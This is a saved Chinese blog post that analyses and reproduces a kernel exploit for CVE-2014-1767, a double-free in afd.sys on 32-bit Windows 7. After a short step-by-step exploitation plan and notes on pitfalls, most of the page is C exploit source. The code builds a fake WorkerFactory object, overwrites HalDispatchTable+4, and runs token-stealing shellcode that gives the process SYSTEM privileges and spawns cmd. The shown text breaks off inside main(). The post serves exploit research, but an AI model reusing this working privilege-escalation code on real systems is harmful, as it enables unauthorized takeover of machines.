<!DOCTYPE html>
<!-- saved from url=(0049)http://www.cnblogs.com/flycat-2016/p/5450328.html -->
<html lang="zh-cn"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园</title>
<link type="text/css" rel="stylesheet" href="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/blog-common.css">
<link id="MainCss" type="text/css" rel="stylesheet" href="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/bundle-LessIsMore.css">
<link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/bundle-LessIsMore-mobile.css">
<link title="RSS" type="application/rss+xml" rel="alternate" href="http://www.cnblogs.com/flycat-2016/rss">
<link title="RSD" type="application/rsd+xml" rel="EditURI" href="http://www.cnblogs.com/flycat-2016/rsd.xml">
<link type="application/wlwmanifest+xml" rel="wlwmanifest" href="http://www.cnblogs.com/flycat-2016/wlwmanifest.xml">
<script async="" src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/analytics.js.下载"></script><script type="text/javascript" src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/encoder.js.下载"></script><script src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/jquery-2.2.0.min.js.下载"></script>
<script type="text/javascript">var currentBlogApp = 'flycat-2016', cb_enable_mathjax=false;var isLogined=true;</script>
<script src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/blog-common.js.下载" type="text/javascript"></script>
<script charset="UTF-8" src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/get"></script></head>
<body><script src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/base.js.下载"></script><div id="topbox"></div>
<a name="top"></a>

<div id="home">
<div id="header">
	<div id="blogTitle">
		
<!--done-->
<div class="title"><a id="Header1_HeaderTitle" class="headermaintitle" href="http://www.cnblogs.com/flycat-2016/">會飛的貓</a></div>
<div class="subtitle"></div>



		
	</div><!--end: blogTitle 博客的标题和副标题 -->
	<div id="navigator">
		
<ul id="navList">
<li id="nav_sitehome"><a id="blog_nav_sitehome" class="menu" href="http://www.cnblogs.com/">博客园</a></li>
<li id="nav_myhome"><a id="blog_nav_myhome" class="menu" href="http://www.cnblogs.com/flycat-2016/">首页</a></li>
<li id="nav_newpost"><a id="blog_nav_newpost" class="menu" rel="nofollow" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">新随笔</a></li>
<li id="nav_contact"><a id="blog_nav_contact" class="menu" rel="nofollow" href="https://msg.cnblogs.com/send/%E6%9C%83%E9%A3%9B%E7%9A%84%E8%B2%93">联系</a></li>
<li id="nav_rss"><a id="blog_nav_rss" class="menu" href="http://www.cnblogs.com/flycat-2016/rss">订阅</a>
<!--<a id="blog_nav_rss_image" class="aHeaderXML" href="http://www.cnblogs.com/flycat-2016/rss"><img src="//www.cnblogs.com/images/xml.gif" alt="订阅" /></a>--></li>
<li id="nav_admin"><a id="blog_nav_admin" class="menu" rel="nofollow" href="https://i.cnblogs.com/">管理</a></li>
</ul>

		<div class="blogStats">
			
			<div id="blog_stats">
<!--done-->
随笔-18&nbsp;
文章-0&nbsp;
评论-3&nbsp;
</div>
			
		</div><!--end: blogStats -->
	</div><!--end: navigator 博客导航栏 -->
</div><!--end: header 头部 -->
<div id="main">
	<div id="mainContent">
	<div class="forFlow">
		
<div id="post_detail">
<!--done-->
<div id="topics">
	<div class="post">
		<h1 class="postTitle">
			<a id="cb_post_title_url" class="postTitle2" href="http://www.cnblogs.com/flycat-2016/p/5450328.html">CVE-2014-1767 利用分析（2015.2）</a>
		</h1>
		<div class="clear"></div>
		<div class="postBody">
			<div id="cnblogs_post_body" class="blogpost-body"><p style="text-align: center;"><span style="font-family: 微软雅黑; font-size: 14pt;"><strong>CVE-2014-1767利用分析 </strong></span></p>
<p style="text-align: justify;"><span style="font-family: 微软雅黑;">参考这篇<a href="http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/">文章</a>利用思路,重现利用，主要说明自己在实现的时候遇到的坑。</span></p>
<p><span style="font-family: 微软雅黑;"><strong>利用思路</strong></span></p>
<p><span style="font-family: 微软雅黑; font-size: 10pt;">1. 第一次 IoControl，释放 MDL，我们通过 VirtualAddress 和 Length 设置此时被释放 的 MDL 内存大小为 0xA0。</span></p>
<p><span style="font-family: 微软雅黑; font-size: 10pt;">2. NtCreateWorkerFactory 申请新的 WorkerFactoy 对象，占据【1】中被释放掉的内 存。</span></p>
<p><span style="font-family: 微软雅黑; font-size: 10pt;">3. 第二次 IoControl，double free会释放掉刚刚申请的 WorkerFactoy 对象。</span></p>
<p><span style="font-family: 微软雅黑; font-size: 10pt;">4. NtQueryEaFile 把我们精心设置的内容，填充到刚被释放掉的 WorkerFactory 对象内存空间(UAF)。</span></p>
<p><span style="font-family: 微软雅黑; font-size: 10pt;">5. NtSetInformationWorkerFactory 操作我们的 fake object，达到修改 HalDispatchTable+4 内容为 shellcode(功能是使用系统token覆盖当前进行token)。</span></p>
<p><span style="font-family: 微软雅黑; font-size: 10pt;">6. 用户层调用 NtQueryIntervalProfile，触发内核执行 shellcode。</span></p>
<p><span style="font-family: 微软雅黑; font-size: 10pt;">7. 当前进行已经是管理员权限了，创建的子进程也具有相同的权限，提权完成。</span></p>
<p><span style="font-family: 微软雅黑;"><strong>一些坑和解释</strong></span></p>
<p><span style="font-family: 微软雅黑; font-size: 10pt;">1. 将初始化的操作都放在第一次IoControl之前，使【1】和【2】的时间间隔最小，这样占位成功的机会最大，但仍有占位不成功的时候，原因未知。</span></p>
<p><span style="font-family: 微软雅黑; font-size: 10pt;">2. 所构造的fake WorkerFactory object 数据如下：</span></p>
<p><img src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/928323-20160501123856410-1417966897.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">object header和object body是需要我们来布置的。 </span></p>
<p><span style="font-family: 微软雅黑;">object header来自一个创建的object的部分。 </span></p>
<p><span style="font-family: 微软雅黑;">object body部分其实就两个位置+00h和+10h，为了最后NtSetInformationWorkerFactory函数中的这条语句：*(*(*object+0x10)+0x1C) = *arg3，使左边的语句为HalDispatchTable+4。 </span></p>
<p><span style="font-family: 微软雅黑;">其他置于0就可以了。</span></p>
<p><span style="font-family: 微软雅黑; font-size: 10pt;">3. 分配的内存数据：</span></p>
<p><img src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/928323-20160501123856816-1716396550.png" alt=""></p>
<p><span style="font-family: 微软雅黑; font-size: 10pt;">4. NtQueryEaFile的参数EaListLength必须为0x98，因为这样才可以保证【4】的正常执行。</span></p>
<p><span style="font-family: 微软雅黑; font-size: 10pt;">5. NtSetInformationWorkerFactory函数的每一个参数都非常重要，不可以设置为其他的值，这都是跟踪得到能够到达目标代码的参数结果。6.&nbsp;</span><span style="font-family: 微软雅黑; font-size: 10pt;">NtQueryIntervalProfile的第一个参数也十分重要，等于2的时候才会走向调用HalDispatchTable+4的流程中去。</span></p>
<p><span style="font-family: 微软雅黑; font-size: 10pt;">7.</span><span style="font-family: 微软雅黑; font-size: 10pt;">Shellcode中，提权结束后会做一些善后处理，将hWorkerFactory在HandleTableEntry的入口设置为NULL，不然提权进程结束后会蓝屏。因为我们已经破坏掉hWorkerFactory所对应的内核结构了，系统会对其进行清理操作的时候就会出问题。</span></p>
<p>&nbsp;</p>
<p><span style="font-family: 微软雅黑;">遗留问题：HalDispatchTable+4的恢复问题，暂时不知道怎么读取其对应函数的地址。不过这个函数调用不是特别频繁，还是可以清楚的看到结果。</span></p>
<p><span style="font-family: 微软雅黑;"><img src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/928323-20160501123857238-1357395101.png" alt=""></span></p>
<p>&nbsp;</p>
<p>exp代码如下：</p>
<p>&nbsp;</p>
<div class="cnblogs_code"><div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div>
<pre><span style="color: #008000;">//</span><span style="color: #008000;">CVE-2014-1767 exp for win7 32bit
</span><span style="color: #008000;">//</span><span style="color: #008000;">by 会飞的猫 2015.2.4
</span><span style="color: #008000;">//</span><span style="color: #008000;">complied with VS2013</span>
#include &lt;windows.h&gt;<span style="color: #000000;">
#include </span>&lt;stdio.h&gt;
<span style="color: #0000ff;">#pragma</span> comment(lib, "WS2_32.lib")

<span style="color: #0000ff;">#define</span> NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)<span style="color: #000000;">
typedef LPVOID PEPROCESS;

typedef NTSTATUS(__stdcall </span>*<span style="color: #000000;">_NtCreateWorkerFactory)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T);
typedef NTSTATUS(__stdcall </span>*<span style="color: #000000;">_NtQueryEaFile)(HANDLE, PVOID, PVOID, ULONG, BOOLEAN, PVOID, ULONG, PULONG, BOOLEAN);
typedef NTSTATUS(__stdcall </span>*<span style="color: #000000;">_ZwAllocateVirtualMemory)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);
typedef NTSTATUS(__stdcall </span>*<span style="color: #000000;">_NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(__stdcall </span>*<span style="color: #000000;">_NtSetInformationWorkerFactory)(HANDLE, ULONG, PVOID, ULONG);
typedef NTSTATUS(__stdcall </span>*<span style="color: #000000;">_NtQueryIntervalProfile)(DWORD,PULONG);
typedef NTSTATUS(__stdcall </span>*_PsLookupProcessByProcessId)(DWORD, LPVOID *<span style="color: #000000;">);
typedef NTSTATUS(__stdcall </span>*<span style="color: #000000;">_NtQueryInformationWorkerFactory)(HANDLE, LONG, PVOID, ULONG, PULONG);

typedef </span><span style="color: #0000ff;">struct</span><span style="color: #000000;"> _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, </span>*<span style="color: #000000;">PIO_STATUS_BLOCK;

typedef </span><span style="color: #0000ff;">struct</span><span style="color: #000000;"> _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;                 </span><span style="color: #008000;">//</span><span style="color: #008000;"> Not filled in</span>
<span style="color: #000000;">    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[</span><span style="color: #800080;">256</span><span style="color: #000000;">];
} RTL_PROCESS_MODULE_INFORMATION, </span>*<span style="color: #000000;">PRTL_PROCESS_MODULE_INFORMATION;

typedef </span><span style="color: #0000ff;">struct</span><span style="color: #000000;"> _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[</span><span style="color: #800080;">1</span><span style="color: #000000;">];
} RTL_PROCESS_MODULES, </span>*<span style="color: #000000;">PRTL_PROCESS_MODULES;

_NtCreateWorkerFactory NtCreateWorkerFactory;
_NtQueryEaFile NtQueryEaFile;
_ZwAllocateVirtualMemory ZwAllocateVirtualMemory;
_NtQuerySystemInformation NtQuerySystemInformation;
_NtSetInformationWorkerFactory NtSetInformationWorkerFactory;
_NtQueryIntervalProfile NtQueryIntervalProfile;
_PsLookupProcessByProcessId PsLookupProcessByProcessId;
_NtQueryInformationWorkerFactory NtQueryInformationWorkerFactory;

HANDLE hWorkerFactory;
LPVOID AllocAddr </span>= (LPVOID)<span style="color: #800080;">0x20000000</span><span style="color: #000000;">;
ULONG uHalDispatchTable </span>= <span style="color: #800080;">0</span><span style="color: #000000;">;
HMODULE ntoskrnl;
ULONG ntoskrnlBase;
PVOID pHaliQuerySystemInformation</span>=<span style="color: #000000;">NULL;

</span><span style="color: #0000ff;">int</span><span style="color: #000000;"> GetNtdllFuncAddr()
{
    HMODULE ntdll </span>= GetModuleHandle(<span style="color: #800000;">"</span><span style="color: #800000;">ntdll.dll</span><span style="color: #800000;">"</span><span style="color: #000000;">);

    NtCreateWorkerFactory </span>= (_NtCreateWorkerFactory)(GetProcAddress(ntdll, <span style="color: #800000;">"</span><span style="color: #800000;">NtCreateWorkerFactory</span><span style="color: #800000;">"</span><span style="color: #000000;">));
    </span><span style="color: #0000ff;">if</span> (NtCreateWorkerFactory ==<span style="color: #000000;"> NULL)
    {
        printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">Get NtCreateWorkerFactory Address Error:%d</span><span style="color: #800000;">"</span><span style="color: #000000;">, GetLastError());
        CloseHandle(ntdll);
        </span><span style="color: #0000ff;">return</span> -<span style="color: #800080;">1</span><span style="color: #000000;">;
    }

    </span><span style="color: #008000;">//</span><span style="color: #008000;">NtQueryEaFile</span>
    NtQueryEaFile = (_NtQueryEaFile)GetProcAddress(ntdll, <span style="color: #800000;">"</span><span style="color: #800000;">NtQueryEaFile</span><span style="color: #800000;">"</span><span style="color: #000000;">);
    </span><span style="color: #0000ff;">if</span> (NtQueryEaFile ==<span style="color: #000000;"> NULL)
    {
        printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">Get NtQueryEaFile Address Error:%d</span><span style="color: #800000;">"</span><span style="color: #000000;">, GetLastError());
        </span><span style="color: #0000ff;">return</span> -<span style="color: #800080;">1</span><span style="color: #000000;">;
    }
    </span><span style="color: #008000;">//</span><span style="color: #008000;">ZwAllocateVirtualMemory</span>
    ZwAllocateVirtualMemory = (_ZwAllocateVirtualMemory)GetProcAddress(ntdll, <span style="color: #800000;">"</span><span style="color: #800000;">ZwAllocateVirtualMemory</span><span style="color: #800000;">"</span><span style="color: #000000;">);
    </span><span style="color: #008000;">//</span><span style="color: #008000;">NtQuerySystemInformation</span>
    NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntdll, <span style="color: #800000;">"</span><span style="color: #800000;">NtQuerySystemInformation</span><span style="color: #800000;">"</span><span style="color: #000000;">);
    </span><span style="color: #0000ff;">if</span> (NtQuerySystemInformation ==<span style="color: #000000;"> NULL)
    {
        printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">Get NtQuerySystemInformation Address Error:%d</span><span style="color: #800000;">"</span><span style="color: #000000;">, GetLastError());
        </span><span style="color: #0000ff;">return</span> -<span style="color: #800080;">1</span><span style="color: #000000;">;
    }
    </span><span style="color: #008000;">//</span><span style="color: #008000;">NtSetInformationWorkerFactory</span>
    NtSetInformationWorkerFactory = (_NtSetInformationWorkerFactory)(GetProcAddress(ntdll, <span style="color: #800000;">"</span><span style="color: #800000;">NtSetInformationWorkerFactory</span><span style="color: #800000;">"</span><span style="color: #000000;">));
    </span><span style="color: #0000ff;">if</span> (NtSetInformationWorkerFactory ==<span style="color: #000000;"> NULL)
    {
        printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">Get NtSetInformationWorkerFactory Address Error:%d</span><span style="color: #800000;">"</span><span style="color: #000000;">, GetLastError());
        </span><span style="color: #0000ff;">return</span> -<span style="color: #800080;">1</span><span style="color: #000000;">;
    }
    </span><span style="color: #008000;">//</span><span style="color: #008000;">_NtQueryIntervalProfile</span>
    NtQueryIntervalProfile = (_NtQueryIntervalProfile)(GetProcAddress(ntdll, <span style="color: #800000;">"</span><span style="color: #800000;">NtQueryIntervalProfile</span><span style="color: #800000;">"</span><span style="color: #000000;">));
    </span><span style="color: #0000ff;">if</span> (NtQueryIntervalProfile ==<span style="color: #000000;"> NULL)
    {
        printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">Get NtQueryIntervalProfile Address Error:%d</span><span style="color: #800000;">"</span><span style="color: #000000;">, GetLastError());
        </span><span style="color: #0000ff;">return</span> -<span style="color: #800080;">1</span><span style="color: #000000;">;
    }
    </span><span style="color: #008000;">//</span><span style="color: #008000;">get uHalDispatchTable</span>
<span style="color: #000000;">    RTL_PROCESS_MODULES module;
    memset(</span>&amp;module, <span style="color: #800080;">0</span>, <span style="color: #0000ff;">sizeof</span><span style="color: #000000;">(RTL_PROCESS_MODULES));
    NTSTATUS status </span>= NtQuerySystemInformation(<span style="color: #800080;">11</span>, &amp;module, <span style="color: #0000ff;">sizeof</span><span style="color: #000000;">(RTL_PROCESS_MODULES), NULL);
    </span><span style="color: #0000ff;">if</span> (status != <span style="color: #800080;">0xC0000004</span>)    <span style="color: #008000;">//</span><span style="color: #008000;">STATUS_INFO_LENGTH_MISMATCH</span>
<span style="color: #000000;">    {
        printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">Get module Address Error:%d</span><span style="color: #800000;">"</span><span style="color: #000000;">, GetLastError());
        </span><span style="color: #0000ff;">return</span> -<span style="color: #800080;">1</span><span style="color: #000000;">;
    }
    ntoskrnlBase </span>= (ULONG)module.Modules[<span style="color: #800080;">0</span><span style="color: #000000;">].ImageBase;
    ntoskrnl </span>= LoadLibrary((LPCSTR)(module.Modules[<span style="color: #800080;">0</span>].FullPathName + module.Modules[<span style="color: #800080;">0</span><span style="color: #000000;">].OffsetToFileName));
    </span><span style="color: #0000ff;">if</span> (ntoskrnl ==<span style="color: #000000;"> NULL)
    {
        printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">LoadLibrary ntoskrnl.exe fail!\n</span><span style="color: #800000;">"</span><span style="color: #000000;">);
        </span><span style="color: #0000ff;">return</span> -<span style="color: #800080;">1</span><span style="color: #000000;">;
    }
    uHalDispatchTable </span>= (ULONG)GetProcAddress(ntoskrnl, <span style="color: #800000;">"</span><span style="color: #800000;">HalDispatchTable</span><span style="color: #800000;">"</span>) - (ULONG)ntoskrnl +<span style="color: #000000;"> ntoskrnlBase;
    </span><span style="color: #0000ff;">if</span> (uHalDispatchTable == <span style="color: #800080;">0</span><span style="color: #000000;">)
    {
        printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">Get HalDispatchTable Error:%d\n</span><span style="color: #800000;">"</span><span style="color: #000000;">, GetLastError());
        </span><span style="color: #0000ff;">return</span> -<span style="color: #800080;">1</span><span style="color: #000000;">;
    }
    </span><span style="color: #008000;">//</span><span style="color: #008000;">printf("HalDispatchTable Address:0x%x!\n", uHalDispatchTable);

    </span><span style="color: #008000;">//</span><span style="color: #008000;">PsLookupProcessByProcessId</span>
    PsLookupProcessByProcessId = (_PsLookupProcessByProcessId)((ULONG)GetProcAddress(ntoskrnl, <span style="color: #800000;">"</span><span style="color: #800000;">PsLookupProcessByProcessId</span><span style="color: #800000;">"</span>) - (ULONG)ntoskrnl +<span style="color: #000000;"> ntoskrnlBase);
    </span><span style="color: #0000ff;">if</span> (PsLookupProcessByProcessId ==<span style="color: #000000;"> NULL)
    {
        printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">Get PsLookupProcessByProcessId Address Error:%d</span><span style="color: #800000;">"</span><span style="color: #000000;">, GetLastError());
        </span><span style="color: #0000ff;">return</span> -<span style="color: #800080;">1</span><span style="color: #000000;">;
    }
    CloseHandle(ntdll);
    </span><span style="color: #0000ff;">return</span> <span style="color: #800080;">0</span><span style="color: #000000;">;
}
</span><span style="color: #008000;">/*</span><span style="color: #008000;">int CreateWorkerFactory()
{
    HANDLE hCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 1337, 4);
    
    DWORD Exploit;
    NTSTATUS status = NtCreateWorkerFactory(&amp;hWorkerFactory, GENERIC_ALL, NULL, hCompletionPort, (HANDLE)-1, &amp;Exploit, NULL, 0, 0, 0);
    if (!NT_SUCCESS(status))
    {
        printf("NtCreateWorkerFactory fail!Error:%d\n", GetLastError());
        return -1;
    }
    return 0;
}</span><span style="color: #008000;">*/</span>
<span style="color: #0000ff;">int</span><span style="color: #000000;"> MyNtQueryEaFile()
{
    NTSTATUS status;
    IO_STATUS_BLOCK StatusBlock;
    
    status </span>= NtQueryEaFile(NULL, (PIO_STATUS_BLOCK)&amp;StatusBlock, NULL, NULL, FALSE, AllocAddr, <span style="color: #800080;">0x98</span><span style="color: #000000;">, NULL, TRUE);
    </span><span style="color: #0000ff;">return</span> <span style="color: #800080;">0</span><span style="color: #000000;">;
}
</span><span style="color: #008000;">//</span><span style="color: #008000;">shellcode代码</span>
<span style="color: #0000ff;">void</span><span style="color: #000000;"> shellcode()
{
    PEPROCESS pCur, pSys;
    DWORD dwSystemProcessId </span>= <span style="color: #800080;">4</span><span style="color: #000000;">;
    DWORD dwCurProcessId </span>=<span style="color: #000000;"> GetCurrentProcessId();
    PsLookupProcessByProcessId(dwCurProcessId, </span>&amp;<span style="color: #000000;">pCur);
    PsLookupProcessByProcessId(dwSystemProcessId, </span>&amp;<span style="color: #000000;">pSys);
    </span><span style="color: #008000;">//</span><span style="color: #008000;">replace current process`s token with system token</span>
    *(PVOID *)((DWORD)pCur + <span style="color: #800080;">0xf8</span>) = *(PVOID *)((DWORD)pSys + <span style="color: #800080;">0xf8</span><span style="color: #000000;">);
    </span><span style="color: #008000;">//</span><span style="color: #008000;">set our handle`s HandleTableEntry with NULL to avoid bugcheck</span>
    PULONG ObjectTable = *(PULONG *)((ULONG)pCur + <span style="color: #800080;">0x0f4</span><span style="color: #000000;">);
    PULONG HandleTableEntry </span>= (PULONG)(*(ULONG*)(ObjectTable)+<span style="color: #800080;">2</span> * ((ULONG)hWorkerFactory &amp; <span style="color: #800080;">0xFFFFFFFC</span><span style="color: #000000;">));
    </span>*HandleTableEntry =<span style="color: #000000;"> NULL;
    </span><span style="color: #008000;">//</span><span style="color: #008000;">dec handle reference by 1</span>
    *(ObjectTable + <span style="color: #800080;">0x30</span>) -= <span style="color: #800080;">1</span><span style="color: #000000;">;
    </span><span style="color: #008000;">//</span><span style="color: #008000;">restore HalDispatchTable+4 to avoid bugcheck
    </span><span style="color: #008000;">//</span><span style="color: #008000;">*(DWORD*)(uHalDispatchTable + 4) = (DWORD)pHaliQuerySystemInformation;</span>
<span style="color: #000000;">}
</span><span style="color: #0000ff;">int</span><span style="color: #000000;"> MyNtSetInformationWorkerFactory()
{
    DWORD</span>* tem = (DWORD*)<span style="color: #0000ff;">malloc</span>(<span style="color: #800080;">0x20</span><span style="color: #000000;">);
    memset(tem, </span><span style="color: #800000;">'</span><span style="color: #800000;">A</span><span style="color: #800000;">'</span>, <span style="color: #800080;">0x20</span><span style="color: #000000;">);
    tem[</span><span style="color: #800080;">0</span>] =<span style="color: #000000;"> (DWORD)shellcode;

    NTSTATUS status </span>= NtSetInformationWorkerFactory(hWorkerFactory, <span style="color: #800080;">0x8</span>, tem, <span style="color: #800080;">0x4</span><span style="color: #000000;">);
    </span><span style="color: #0000ff;">return</span> <span style="color: #800080;">0</span><span style="color: #000000;">;
}
</span><span style="color: #0000ff;">void</span><span style="color: #000000;"> CreatNewCmd()
{
    STARTUPINFO         StartupInfo;
    PROCESS_INFORMATION ProcessInfo;

    memset(</span>&amp;StartupInfo, <span style="color: #800080;">0</span>, <span style="color: #0000ff;">sizeof</span><span style="color: #000000;">(StartupInfo));
    memset(</span>&amp;ProcessInfo, <span style="color: #800080;">0</span>, <span style="color: #0000ff;">sizeof</span><span style="color: #000000;">(ProcessInfo));

    StartupInfo.cb </span>= <span style="color: #0000ff;">sizeof</span><span style="color: #000000;">(STARTUPINFO);
    StartupInfo.wShowWindow </span>= <span style="color: #800080;">0</span><span style="color: #000000;">;
    StartupInfo.dwFlags </span>= <span style="color: #800080;">0</span><span style="color: #000000;">;
    CreateProcess(</span><span style="color: #800080;">0</span>, <span style="color: #800000;">"</span><span style="color: #800000;">cmd</span><span style="color: #800000;">"</span>, <span style="color: #800080;">0</span>, <span style="color: #800080;">0</span>, <span style="color: #800080;">0</span>, CREATE_NEW_CONSOLE, <span style="color: #800080;">0</span>, <span style="color: #800080;">0</span>, &amp;StartupInfo, &amp;<span style="color: #000000;">ProcessInfo);
    WaitForSingleObject(ProcessInfo.hProcess, </span><span style="color: #800080;">60000</span><span style="color: #000000;">);
    CloseHandle(ProcessInfo.hProcess);
    CloseHandle(ProcessInfo.hThread);
}
</span><span style="color: #0000ff;">void</span><span style="color: #000000;"> GetHaliQuerySystemInformation()
{
    </span><span style="color: #0000ff;">static</span> BYTE kernelRetMem[<span style="color: #800080;">0x60</span><span style="color: #000000;">];
    memset(kernelRetMem, </span><span style="color: #800080;">0</span>, <span style="color: #0000ff;">sizeof</span><span style="color: #000000;">(kernelRetMem));

    NtQueryInformationWorkerFactory(hWorkerFactory,
        </span><span style="color: #800080;">7</span><span style="color: #000000;">,
        kernelRetMem,
        </span><span style="color: #800080;">0x60</span><span style="color: #000000;">,
        NULL);

    pHaliQuerySystemInformation </span>= *(PVOID *)(kernelRetMem + <span style="color: #800080;">0x50</span><span style="color: #000000;">);
    printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">uHaliQuerySystemInformation: %p\n</span><span style="color: #800000;">"</span><span style="color: #000000;">, pHaliQuerySystemInformation);
    </span><span style="color: #0000ff;">return</span><span style="color: #000000;">;
}
</span><span style="color: #0000ff;">int</span><span style="color: #000000;"> main()
{
    printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">----------------------------------------\n</span><span style="color: #800000;">"</span><span style="color: #000000;">);
    printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">****CVE-2014-1767 exp for win7 32bit****\n</span><span style="color: #800000;">"</span><span style="color: #000000;">);
    printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">****by flycat 2015.2.4****\n</span><span style="color: #800000;">"</span><span style="color: #000000;">);
    printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">----------------------------------------\n</span><span style="color: #800000;">"</span><span style="color: #000000;">);
    printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">\n\n\n\n</span><span style="color: #800000;">"</span><span style="color: #000000;">);
    DWORD targetSize </span>= <span style="color: #800080;">0xA0</span><span style="color: #000000;">;
    DWORD virtualAddress </span>= <span style="color: #800080;">0x13371337</span><span style="color: #000000;">;
    DWORD Length </span>= ((targetSize - <span style="color: #800080;">0x1C</span>) / <span style="color: #800080;">4</span> - (virtualAddress % <span style="color: #800080;">4</span> ? <span style="color: #800080;">1</span> : <span style="color: #800080;">0</span>)) * <span style="color: #800080;">0x1000</span><span style="color: #000000;">;


    </span><span style="color: #0000ff;">static</span> DWORD inbuf1[<span style="color: #800080;">100</span><span style="color: #000000;">];
    memset(inbuf1, </span><span style="color: #800080;">0</span>, <span style="color: #0000ff;">sizeof</span><span style="color: #000000;">(inbuf1));
    inbuf1[</span><span style="color: #800080;">6</span>] =<span style="color: #000000;"> virtualAddress;
    inbuf1[</span><span style="color: #800080;">7</span>] =<span style="color: #000000;"> Length;


    </span><span style="color: #0000ff;">static</span> DWORD inbuf2[<span style="color: #800080;">100</span><span style="color: #000000;">];
    memset(inbuf2, </span><span style="color: #800080;">0</span>, <span style="color: #0000ff;">sizeof</span><span style="color: #000000;">(inbuf2));
    inbuf2[</span><span style="color: #800080;">0</span>] = <span style="color: #800080;">1</span><span style="color: #000000;">;
    inbuf2[</span><span style="color: #800080;">1</span>] = <span style="color: #800080;">0x0AAAAAAA</span><span style="color: #000000;">;

    WSADATA WSAData;
    SOCKET s;
    sockaddr_in sa;
    </span><span style="color: #0000ff;">int</span><span style="color: #000000;"> ier;

    WSAStartup(</span><span style="color: #800080;">0x2</span>, &amp;<span style="color: #000000;">WSAData);
    s </span>=<span style="color: #000000;"> socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    memset(</span>&amp;sa, <span style="color: #800080;">0</span>, <span style="color: #0000ff;">sizeof</span><span style="color: #000000;">(sa));
    sa.sin_port </span>= htons(<span style="color: #800080;">135</span><span style="color: #000000;">);
    sa.sin_addr.S_un.S_addr </span>= inet_addr(<span style="color: #800000;">"</span><span style="color: #800000;">127.0.1</span><span style="color: #800000;">"</span><span style="color: #000000;">);
    sa.sin_family </span>=<span style="color: #000000;"> AF_INET;
    ier </span>= connect(s, (<span style="color: #0000ff;">const</span> <span style="color: #0000ff;">struct</span> sockaddr *)&amp;sa, <span style="color: #0000ff;">sizeof</span><span style="color: #000000;">(sa));

    </span><span style="color: #0000ff;">static</span> <span style="color: #0000ff;">char</span> outBuf[<span style="color: #800080;">100</span><span style="color: #000000;">];
    DWORD bytesRet;

    </span><span style="color: #0000ff;">int</span> nRet = <span style="color: #800080;">0</span><span style="color: #000000;">;
    </span><span style="color: #008000;">//</span><span style="color: #008000;">get some kernel function addresses</span>
    nRet =<span style="color: #000000;"> GetNtdllFuncAddr();
    </span><span style="color: #0000ff;">if</span> (nRet != <span style="color: #800080;">0</span><span style="color: #000000;">)
    {
        </span><span style="color: #0000ff;">return</span> -<span style="color: #800080;">1</span><span style="color: #000000;">;
    }
    </span><span style="color: #008000;">//</span><span style="color: #008000;">allocate  memory and set some data</span>
    DWORD uRegionSize = <span style="color: #800080;">0x200</span><span style="color: #000000;">;
    NTSTATUS status </span>=<span style="color: #000000;"> ZwAllocateVirtualMemory(GetCurrentProcess(),
        </span>&amp;AllocAddr, <span style="color: #800080;">0</span>, &amp;<span style="color: #000000;">uRegionSize,
        MEM_COMMIT </span>| MEM_RESERVE |<span style="color: #000000;"> MEM_TOP_DOWN,
        PAGE_EXECUTE_READWRITE);
    </span><span style="color: #0000ff;">if</span> (!<span style="color: #000000;">NT_SUCCESS(status))
    {
